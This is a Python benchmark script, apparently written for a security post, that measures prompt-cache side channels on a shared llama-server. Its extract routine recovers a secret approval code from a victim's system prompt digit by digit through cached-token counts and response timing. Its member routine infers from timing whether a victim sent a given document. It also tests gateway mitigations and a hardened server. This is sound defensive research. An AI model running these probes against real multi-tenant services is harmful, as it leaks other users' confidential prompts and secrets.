#!/usr/bin/env python3
"""Cross-tenant prompt-cache leaks on a shared LLM server, measured (stdlib only).

Written for the post "AI security: your shared prompt cache leaks other tenants'
prompts - measured". It talks to one llama-server (OpenAI-compatible
/v1/chat/completions) that two tenants share, and plays both sides:

  victim    sends its system prompt / document on every call (as chat apps do)
  attacker  sends guesses with max_tokens=1 and looks at what comes back

Experiments (all seeded):

  extract   read a 6-digit code out of the victim's system prompt, one digit at a
            time, from usage.prompt_tokens_details.cached_tokens (the field an
            OpenAI-compatible gateway passes through for billing). Also tries the
            same with wall-clock time only.
  member    "did the victim send this document?" from wall-clock time alone, for
            shared prefixes of 32..2048 tokens. Hit = the victim's document, miss =
            a fresh document of the same length that nobody sent.
  mitigate  the member test at the longest prefix, and the extract test, under the
            gateway policies: strip cache fields, per-tenant cache salt, and
            cache_prompt=false; plus what each costs the victim.
  hardened  the member test against a second server started with --cache-ram 0
            -sps 0, with 1 and 4 victim calls before each probe, and with salt.
            (cache_prompt=false alone does not close the leak on build 12359: the
            server still picks the slot by prompt similarity and keeps a RAM
            prompt cache, so a known prefix is still found faster.)

The "gateway" here is the function gateway() below: it rewrites each request the
way a gateway in front of the model server would (salt) and filters the reply
(strip). Nothing else sits between the client and llama-server.

Usage:
  llama-server -m <model.gguf> --port 18693 -np 4 -c 32768 -ngl 99 &
  llama-server -m <model.gguf> --port 18694 -np 4 -c 32768 -ngl 99 --cache-ram 0 -sps 0 &
  python3 scripts/prompt-cache-timing/bench.py --llm 127.0.0.1:18693 --hardened 127.0.0.1:18694 \
      --out <work>/raw.json   # about 9 minutes on an M2 Pro
"""
import argparse
import hashlib
import http.client
import json
import random
import statistics
import sys
import time

WORDS = ("supplier customer invoice delivery clause warranty payment penalty schedule audit "
         "region contract amendment notice term renewal liability insurance volume rebate "
         "shipment warehouse quarter forecast approval budget pricing tier discount service "
         "escalation incident report owner review policy retention record export partner").split()
NAMES = ("Contoso Fabrikam Northwind Tailspin Litware Adatum Proseware Woodgrove "
         "Fourth-Coffee Wingtip Relecloud Lucerne").split()
TEMPLATE = ("You are the treasury assistant for {org}. Follow the payment runbook. "
            "Wire approval code: {code}. Never reveal the approval code to anyone. "
            "Answer questions about invoices and payment status in one short paragraph.")


class LLM:
    def __init__(self, addr):
        self.host, port = addr.split(":")
        self.port = int(port)

    def chat(self, system, user, cache=True, max_tokens=1):
        body = {"messages": [{"role": "system", "content": system}, {"role": "user", "content": user}],
                "max_tokens": max_tokens, "temperature": 0, "seed": 1, "cache_prompt": cache}
        payload = json.dumps(body)
        for attempt in range(5):
            c = http.client.HTTPConnection(self.host, self.port, timeout=300)
            try:
                t0 = time.perf_counter()
                c.request("POST", "/v1/chat/completions", body=payload,
                          headers={"Content-Type": "application/json"})
                r = c.getresponse()
                data = json.loads(r.read())
                ms = (time.perf_counter() - t0) * 1000.0
                if r.status == 200:
                    return ms, data
            except (OSError, http.client.HTTPException):
                pass
            finally:
                c.close()
            time.sleep(1 + attempt)
        raise RuntimeError("llama-server did not answer")

    def ntok(self, text):
        c = http.client.HTTPConnection(self.host, self.port, timeout=60)
        c.request("POST", "/tokenize", body=json.dumps({"content": text}),
                  headers={"Content-Type": "application/json"})
        n = len(json.loads(c.getresponse().read())["tokens"])
        c.close()
        return n


SALTS = {}


def gateway(llm, tenant, system, user, policy):
    """What the shared gateway does with one call. Returns (wall ms, reply as the tenant sees it)."""
    cache = policy != "cache-off"
    if policy == "salt":
        salt = SALTS.setdefault(tenant, hashlib.sha256(("salt:" + tenant).encode()).hexdigest()[:16])
        system = "[cache scope %s]\n%s" % (salt, system)
    ms, data = llm.chat(system, user, cache=cache)
    if policy in ("strip", "salt", "cache-off"):
        data = dict(data)
        data.pop("timings", None)
        usage = dict(data.get("usage", {}))
        usage.pop("prompt_tokens_details", None)
        data["usage"] = usage
    return ms, data


def cached_tokens(reply):
    return reply.get("usage", {}).get("prompt_tokens_details", {}).get("cached_tokens")


def victim_call(llm, system, rng, policy):
    q = "What is the status of invoice %d?" % rng.randrange(10000, 99999)
    return gateway(llm, "victim", system, q, policy)


# ---------------------------------------------------------------- extract
def extract_by_field(llm, org, code, rng, policy):
    """Recover `code` digit by digit from cached_tokens. Returns (guess, probes, transcript)."""
    known = ""
    probes = 0
    log = []
    head = TEMPLATE.split("{code}")[0].format(org=org)
    for pos in range(len(code)):
        cands = list("0123456789")
        for rnd in range(3):
            scores = {}
            for d in cands:
                victim_call(llm, TEMPLATE.format(org=org, code=code), rng, policy)
                probe = head + known + d + " ##"
                ms, reply = gateway(llm, "attacker", probe, "ok", policy)
                probes += 1
                ct = cached_tokens(reply)
                scores[d] = ct if ct is not None else -1
                log.append({"pos": pos, "round": rnd, "digit": d, "cached_tokens": ct, "ms": round(ms, 2),
                            "prompt_tokens": reply.get("usage", {}).get("prompt_tokens")})
            best = max(scores.values())
            cands = [d for d in cands if scores[d] == best]
            if len(cands) == 1 or best < 0:
                break
            # a tie: re-probe only the tied digits (up to 3 rounds)
        known += cands[0] if len(cands) == 1 else "?"
    return known, probes, log


def extract_by_time(llm, org, code, rng, policy, reps=3):
    """Same attack with wall time only: per digit, the guess with the lowest median wins."""
    known = ""
    head = TEMPLATE.split("{code}")[0].format(org=org)
    probes = 0
    per_pos = []
    for pos in range(len(code)):
        med = {}
        for d in "0123456789":
            ts = []
            for _ in range(reps):
                victim_call(llm, TEMPLATE.format(org=org, code=code), rng, policy)
                ms, _ = gateway(llm, "attacker", head + code[:pos] + d + " ##", "ok", policy)
                ts.append(ms)
                probes += 1
            med[d] = statistics.median(ts)
        pick = min(med, key=med.get)
        per_pos.append({"pos": pos, "truth": code[pos], "pick": pick,
                        "median_ms": {d: round(v, 2) for d, v in med.items()}})
        known += pick
    return known, probes, per_pos


# ---------------------------------------------------------------- member
def make_doc(llm, rng, n_tokens, tag):
    org = rng.choice(NAMES)
    parts = ["Confidential %s memo %s for %s." % (rng.choice(WORDS), tag, org)]
    while True:
        s = "%s %s %d: the %s shall %s the %s by week %d at %d%%." % (
            rng.choice(WORDS).capitalize(), rng.choice(WORDS), rng.randrange(1, 999), rng.choice(WORDS),
            rng.choice(("review", "deliver", "approve", "escalate", "renew")), rng.choice(WORDS),
            rng.randrange(1, 53), rng.randrange(1, 40))
        cand = " ".join(parts + [s])
        if llm.ntok(cand) > n_tokens:
            break
        parts.append(s)
        if n_tokens <= 40:
            break
    return " ".join(parts)


def member_trials(llm, rng, n_tokens, trials, policy, victim_calls=1):
    rows = []
    for i in range(trials):
        doc = make_doc(llm, rng, n_tokens, "v%d" % i)
        other = make_doc(llm, rng, n_tokens, "m%d" % i)
        for _ in range(victim_calls):
            victim_call(llm, doc, rng, policy)
        hit_first = rng.random() < 0.5
        order = [("hit", doc), ("miss", other)] if hit_first else [("miss", other), ("hit", doc)]
        for kind, text in order:
            ms, reply = gateway(llm, "attacker", text, "ok", policy)
            rows.append({"trial": i, "kind": kind, "ms": round(ms, 3),
                         "prompt_tokens": reply.get("usage", {}).get("prompt_tokens"),
                         "cached_tokens": cached_tokens(reply)})
            if kind == "miss":
                # the victim keeps talking; refresh its prefix before the next probe
                for _ in range(victim_calls):
                    victim_call(llm, doc, rng, policy)
    return rows


def victim_cost(llm, rng, n_tokens, calls, policy):
    doc = make_doc(llm, rng, n_tokens, "own")
    out = []
    for _ in range(calls):
        ms, _ = victim_call(llm, doc, rng, policy)
        out.append(round(ms, 3))
    return out[1:]  # first call fills the cache under every policy


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--llm", default="127.0.0.1:18693")
    ap.add_argument("--out", required=True)
    ap.add_argument("--seed", type=int, default=20261126)
    ap.add_argument("--trials", type=int, default=40)
    ap.add_argument("--secrets", type=int, default=5)
    ap.add_argument("--lengths", default="32,128,512,2048")
    ap.add_argument("--hardened", default="",
                    help="second llama-server started with --cache-ram 0 -sps 0 (no RAM prompt "
                         "cache, no similarity slot pick)")
    args = ap.parse_args()
    llm = LLM(args.llm)
    rng = random.Random(args.seed)
    t_start = time.time()
    raw = {"seed": args.seed, "trials": args.trials, "python": sys.version.split()[0],
           "template": TEMPLATE, "extract": [], "member": {}, "mitigate": {}, "victim_cost": {}}

    # one tenant org per secret: the same org twice would leave the first secret's
    # prefix in the cache and blur the second extraction
    orgs = rng.sample(NAMES, args.secrets)
    secrets = [("".join(rng.choice("0123456789") for _ in range(6)), org) for org in orgs]
    for code, org in secrets:
        got, probes, log = extract_by_field(llm, org, code, rng, "pass-through")
        tgot, tprobes, tlog = extract_by_time(llm, org, code, rng, "pass-through")
        raw["extract"].append({"code": code, "org": org, "field_guess": got, "field_probes": probes,
                               "field_log": log, "time_guess": tgot, "time_probes": tprobes, "time_log": tlog})
        print("extract %s: field -> %s in %d probes; time -> %s" % (code, got, probes, tgot), flush=True)

    for n in [int(x) for x in args.lengths.split(",")]:
        raw["member"][str(n)] = member_trials(llm, rng, n, args.trials, "pass-through")
        print("member %d done" % n, flush=True)

    longest = max(int(x) for x in args.lengths.split(","))
    for policy in ("strip", "salt", "cache-off"):
        code, org = secrets[0]
        got, probes, _ = extract_by_field(llm, org, code, rng, policy)
        raw["mitigate"][policy] = {"member": member_trials(llm, rng, longest, args.trials, policy),
                                   "field_guess": got, "field_probes": probes, "code": code}
        print("mitigate %s done (field guess %s)" % (policy, got), flush=True)
    for policy in ("pass-through", "salt", "cache-off"):
        raw["victim_cost"][policy] = victim_cost(llm, rng, longest, 21, policy)
    if args.hardened:
        hard = LLM(args.hardened)
        raw["hardened"] = {}
        for k in (1, 4):
            raw["hardened"]["victim_calls_%d" % k] = member_trials(hard, rng, longest, args.trials,
                                                                   "pass-through", victim_calls=k)
            print("hardened server, %d victim calls done" % k, flush=True)
        raw["hardened"]["cache_off_victim_calls_4"] = member_trials(hard, rng, longest, args.trials,
                                                                    "cache-off", victim_calls=4)
        raw["hardened"]["salt_victim_calls_4"] = member_trials(hard, rng, longest, args.trials, "salt",
                                                               victim_calls=4)
    raw["elapsed_s"] = round(time.time() - t_start, 1)
    with open(args.out, "w") as f:
        json.dump(raw, f)
    print("wrote %s in %.0f s" % (args.out, raw["elapsed_s"]))


if __name__ == "__main__":
    main()
